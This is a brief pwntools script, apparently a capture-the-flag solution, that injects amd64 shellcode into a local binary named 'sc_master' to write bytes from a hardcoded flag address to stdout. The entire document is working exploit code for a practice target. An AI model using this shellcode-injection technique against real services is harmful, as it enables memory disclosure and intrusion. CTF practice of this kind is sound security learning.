from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

flag = 0x000000000404080
shellcode = asm(f'''
    mov rax, 1
    mov rdi, 1
    mov rsi, {flag}
    mov rdx, 0x30
    syscall
''')

r = process('./sc_master')

r.sendlineafter(b': ', shellcode)

r.interactive()